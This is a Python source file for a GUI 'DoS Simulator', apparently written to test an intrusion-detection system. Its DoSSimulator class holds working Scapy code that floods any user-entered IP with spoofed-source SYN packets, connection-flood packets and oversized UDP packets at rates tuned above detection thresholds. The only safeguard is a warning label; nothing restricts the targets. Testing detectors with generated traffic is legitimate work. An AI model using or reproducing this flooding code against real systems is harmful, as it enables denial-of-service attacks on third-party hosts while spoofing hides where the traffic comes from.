"""
DoS Simulator - Generate synthetic DoS traffic for testing
Simulates various DoS attack patterns for validation of the detection system
WARNING: Use only on networks you control or have authorization to test!
"""

import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
from datetime import datetime
import random
import socket
from scapy.all import IP, TCP, UDP, send, conf
from config import Config

class DoSSimulator:
    """Generates synthetic DoS traffic patterns for testing"""
    
    def __init__(self):
        self.running = False
        self.target_ip = None
        self.attack_type = None
        self.intensity = 1.0
        self.thread = None
        
    def simulate_high_request_rate(self, target_ip, duration=10, intensity=1.0):
        """Simulate high request rate attack"""
        self.running = True
        self.target_ip = target_ip
        self.attack_type = "High Request Rate"
        self.intensity = intensity
        
        packets_per_sec = int(Config.MAX_REQUESTS_PER_SECOND * 1.5 * intensity)
        packet_interval = 1.0 / packets_per_sec if packets_per_sec > 0 else 0.001
        
        start_time = time.time()
        packet_count = 0
        
        try:
            # Suppress Scapy warnings
            conf.verb = 0
            
            while self.running and (time.time() - start_time) < duration:
                # Create packet with spoofed source IP
                src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                dst_port = random.randint(80, 65535)
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(dport=dst_port, flags="S")
                
                try:
                    send(packet, verbose=0)
                    packet_count += 1
                except Exception as e:
                    print(f"[WARNING] Packet send failed: {e}")
                    
                time.sleep(packet_interval)
                
            print(f"[SUCCESS] Sent {packet_count} packets in {time.time() - start_time:.2f}s")
            
        except Exception as e:
            print(f"[ERROR] High request rate simulation failed: {e}")
        finally:
            self.running = False
            
    def simulate_connection_flood(self, target_ip, duration=10, intensity=1.0):
        """Simulate connection flood attack"""
        self.running = True
        self.target_ip = target_ip
        self.attack_type = "Connection Flood"
        self.intensity = intensity
        
        connections_per_sec = int(Config.MAX_CONNECTIONS_PER_IP * 1.5 * intensity)
        connection_interval = 1.0 / connections_per_sec if connections_per_sec > 0 else 0.001
        
        start_time = time.time()
        connection_count = 0
        
        try:
            conf.verb = 0
            
            while self.running and (time.time() - start_time) < duration:
                # Create connection attempt packets
                src_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                dst_port = 80  # HTTP port
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(dport=dst_port, flags="S")
                
                try:
                    send(packet, verbose=0)
                    connection_count += 1
                except Exception as e:
                    print(f"[WARNING] Connection packet failed: {e}")
                    
                time.sleep(connection_interval)
                
            print(f"[SUCCESS] Simulated {connection_count} connections in {time.time() - start_time:.2f}s")
            
        except Exception as e:
            print(f"[ERROR] Connection flood simulation failed: {e}")
        finally:
            self.running = False
            
    def simulate_syn_flood(self, target_ip, duration=10, intensity=1.0):
        """Simulate SYN flood attack"""
        self.running = True
        self.target_ip = target_ip
        self.attack_type = "SYN Flood"
        self.intensity = intensity
        
        syn_packets_per_sec = int(Config.SYN_FLOOD_THRESHOLD * 1.5 * intensity)
        syn_interval = 1.0 / syn_packets_per_sec if syn_packets_per_sec > 0 else 0.001
        
        start_time = time.time()
        syn_count = 0
        
        try:
            conf.verb = 0
            
            while self.running and (time.time() - start_time) < duration:
                # Create SYN flood packets
                src_ip = f"172.{random.randint(16,31)}.{random.randint(0,255)}.{random.randint(1,254)}"
                src_port = random.randint(10000, 65535)
                dst_port = random.randint(1, 65535)
                
                packet = IP(src=src_ip, dst=target_ip) / TCP(
                    sport=src_port,
                    dport=dst_port,
                    flags="S",
                    seq=random.randint(0, 2**32-1)
                )
                
                try:
                    send(packet, verbose=0)
                    syn_count += 1
                except Exception as e:
                    print(f"[WARNING] SYN packet failed: {e}")
                    
                time.sleep(syn_interval)
                
            print(f"[SUCCESS] Sent {syn_count} SYN packets in {time.time() - start_time:.2f}s")
            
        except Exception as e:
            print(f"[ERROR] SYN flood simulation failed: {e}")
        finally:
            self.running = False
            
    def simulate_packet_size_attack(self, target_ip, duration=10, intensity=1.0):
        """Simulate abnormal packet size attack"""
        self.running = True
        self.target_ip = target_ip
        self.attack_type = "Abnormal Packet Size"
        self.intensity = intensity
        
        packets_per_sec = int(50 * intensity)
        packet_interval = 1.0 / packets_per_sec if packets_per_sec > 0 else 0.001
        
        start_time = time.time()
        packet_count = 0
        
        try:
            conf.verb = 0
            
            while self.running and (time.time() - start_time) < duration:
                src_ip = f"203.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                
                # Create oversized payload (exceeds normal packet size)
                payload = b"X" * random.randint(10000, 65500)
                
                packet = IP(src=src_ip, dst=target_ip) / UDP(dport=53) / payload
                
                try:
                    send(packet, verbose=0)
                    packet_count += 1
                except Exception as e:
                    print(f"[WARNING] Oversized packet failed: {e}")
                    
                time.sleep(packet_interval)
                
            print(f"[SUCCESS] Sent {packet_count} oversized packets in {time.time() - start_time:.2f}s")
            
        except Exception as e:
            print(f"[ERROR] Packet size attack simulation failed: {e}")
        finally:
            self.running = False
            
    def stop(self):
        """Stop simulation"""
        self.running = False


class DoSSimulatorGUI:
    """GUI for DoS simulator"""
    
    def __init__(self, root):
        self.root = root
        self.root.title("DoS Simulator - Testing Tool")
        self.root.geometry("600x700")
        self.root.minsize(500, 600)
        
        self.simulator = DoSSimulator()
        self.simulation_thread = None
        self.running_simulation = False
        
        self._setup_styles()
        self._create_widgets()
        
    def _setup_styles(self):
        """Configure ttk styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure('TFrame', background='#F5F5F5')
        style.configure('TLabel', background='#F5F5F5')
        style.configure('Title.TLabel', font=('Segoe UI', 14, 'bold'), foreground='#333')
        style.configure('Subtitle.TLabel', font=('Segoe UI', 10, 'bold'), foreground='#666')
        style.configure('Warning.TLabel', font=('Segoe UI', 9), foreground='#F44336')
        style.configure('Start.TButton', font=('Segoe UI', 10, 'bold'))
        style.configure('Stop.TButton', font=('Segoe UI', 10, 'bold'))
        
    def _create_widgets(self):
        """Create GUI widgets"""
        main_container = ttk.Frame(self.root, padding=15)
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Title
        title = ttk.Label(main_container, text="⚠️ DoS Simulator - Testing Tool", style='Title.TLabel')
        title.pack(pady=(0, 5))
        
        # Warning
        warning = ttk.Label(
            main_container,
            text="⚡ WARNING: Only use on networks you own or have permission to test!",
            style='Warning.TLabel'
        )
        warning.pack(pady=(0, 15))
        
        # Input section
        input_frame = ttk.LabelFrame(main_container, text="Configuration", padding=15)
        input_frame.pack(fill=tk.X, pady=(0, 15))
        
        # Target IP
        ttk.Label(input_frame, text="Target IP Address:").pack(anchor="w", pady=(0, 5))
        self.target_ip_var = tk.StringVar(value="127.0.0.1")
        target_entry = ttk.Entry(input_frame, textvariable=self.target_ip_var, width=40)
        target_entry.pack(fill=tk.X, pady=(0, 15))
        
        # Duration
        ttk.Label(input_frame, text="Duration (seconds):").pack(anchor="w", pady=(0, 5))
        self.duration_var = tk.StringVar(value="10")
        duration_entry = ttk.Entry(input_frame, textvariable=self.duration_var, width=40)
        duration_entry.pack(fill=tk.X, pady=(0, 15))
        
        # Intensity
        ttk.Label(input_frame, text="Intensity (1.0 = threshold, 2.0 = 2x threshold):").pack(anchor="w", pady=(0, 5))
        self.intensity_var = tk.DoubleVar(value=1.5)
        intensity_scale = ttk.Scale(
            input_frame,
            from_=0.5,
            to=5.0,
            orient=tk.HORIZONTAL,
            variable=self.intensity_var,
            command=self._update_intensity_label
        )
        intensity_scale.pack(fill=tk.X, pady=(0, 5))
        
        self.intensity_label = ttk.Label(input_frame, text="1.5x", font=('Segoe UI', 10, 'bold'))
        self.intensity_label.pack(anchor="w", pady=(0, 15))
        
        # Attack type selection
        ttk.Label(input_frame, text="Attack Type:").pack(anchor="w", pady=(0, 10))
        
        self.attack_var = tk.StringVar(value="high_request_rate")
        
        attack_options = [
            ("High Request Rate Attack", "high_request_rate"),
            ("Connection Flood Attack", "connection_flood"),
            ("SYN Flood Attack", "syn_flood"),
            ("Abnormal Packet Size Attack", "packet_size")
        ]
        
        for label, value in attack_options:
            ttk.Radiobutton(
                input_frame,
                text=label,
                variable=self.attack_var,
                value=value
            ).pack(anchor="w", pady=5)
        
        # Buttons
        button_frame = ttk.Frame(main_container)
        button_frame.pack(fill=tk.X, pady=(0, 15))
        
        self.start_button = ttk.Button(
            button_frame,
            text="▶ Start Simulation",
            style='Start.TButton',
            command=self._start_simulation
        )
        self.start_button.pack(side=tk.LEFT, padx=(0, 5), fill=tk.X, expand=True)
        
        self.stop_button = ttk.Button(
            button_frame,
            text="⏹ Stop Simulation",
            style='Stop.TButton',
            command=self._stop_simulation,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # Status section
        status_frame = ttk.LabelFrame(main_container, text="Status", padding=15)
        status_frame.pack(fill=tk.BOTH, expand=True)
        
        self.status_label = tk.Text(status_frame, height=12, width=60, state=tk.DISABLED, wrap=tk.WORD)
        self.status_label.pack(fill=tk.BOTH, expand=True)
        
        scrollbar = ttk.Scrollbar(status_frame, orient=tk.VERTICAL, command=self.status_label.yview)
        self.status_label['yscrollcommand'] = scrollbar.set
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Initial message
        self._log_status("Ready to start simulation")
        self._log_status("Select attack type, configure parameters, and click 'Start Simulation'")
        
    def _update_intensity_label(self, value):
        """Update intensity label"""
        self.intensity_label.config(text=f"{float(value):.1f}x")
        
    def _log_status(self, message):
        """Add message to status log"""
        self.status_label.config(state=tk.NORMAL)
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.status_label.insert(tk.END, f"[{timestamp}] {message}\n")
        self.status_label.see(tk.END)
        self.status_label.config(state=tk.DISABLED)
        self.root.update()
        
    def _validate_input(self):
        """Validate input parameters"""
        try:
            target_ip = self.target_ip_var.get().strip()
            if not target_ip:
                messagebox.showerror("Error", "Please enter a target IP address")
                return False
                
            # Basic IP validation
            parts = target_ip.split('.')
            if len(parts) != 4 or not all(0 <= int(p) <= 255 for p in parts):
                messagebox.showerror("Error", "Invalid IP address format")
                return False
                
            duration = int(self.duration_var.get())
            if duration < 1 or duration > 300:
                messagebox.showerror("Error", "Duration must be between 1 and 300 seconds")
                return False
                
            return True
        except ValueError:
            messagebox.showerror("Error", "Invalid input. Check duration is a number")
            return False
            
    def _start_simulation(self):
        """Start DoS simulation"""
        if not self._validate_input():
            return
            
        if self.running_simulation:
            messagebox.showwarning("Warning", "Simulation already running")
            return
            
        try:
            target_ip = self.target_ip_var.get()
            duration = int(self.duration_var.get())
            intensity = self.intensity_var.get()
            attack_type = self.attack_var.get()
            
            self._log_status(f"Starting {attack_type.replace('_', ' ')} simulation...")
            self._log_status(f"Target: {target_ip} | Duration: {duration}s | Intensity: {intensity:.1f}x")
            
            self.running_simulation = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            
            # Run simulation in thread
            if attack_type == "high_request_rate":
                self.simulation_thread = threading.Thread(
                    target=self.simulator.simulate_high_request_rate,
                    args=(target_ip, duration, intensity)
                )
            elif attack_type == "connection_flood":
                self.simulation_thread = threading.Thread(
                    target=self.simulator.simulate_connection_flood,
                    args=(target_ip, duration, intensity)
                )
            elif attack_type == "syn_flood":
                self.simulation_thread = threading.Thread(
                    target=self.simulator.simulate_syn_flood,
                    args=(target_ip, duration, intensity)
                )
            elif attack_type == "packet_size":
                self.simulation_thread = threading.Thread(
                    target=self.simulator.simulate_packet_size_attack,
                    args=(target_ip, duration, intensity)
                )
                
            self.simulation_thread.start()
            
            # Monitor thread
            self.root.after(500, self._check_simulation_status)
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start simulation: {e}")
            self.running_simulation = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            
    def _stop_simulation(self):
        """Stop DoS simulation"""
        self.simulator.stop()
        self._log_status("Stopping simulation...")
        
    def _check_simulation_status(self):
        """Check if simulation is still running"""
        if not self.simulator.running and self.running_simulation:
            self.running_simulation = False
            self._log_status("✓ Simulation completed")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
        elif self.running_simulation:
            self.root.after(500, self._check_simulation_status)


def main():
    """Main entry point"""
    root = tk.Tk()
    app = DoSSimulatorGUI(root)
    root.mainloop()


if __name__ == '__main__':
    main()
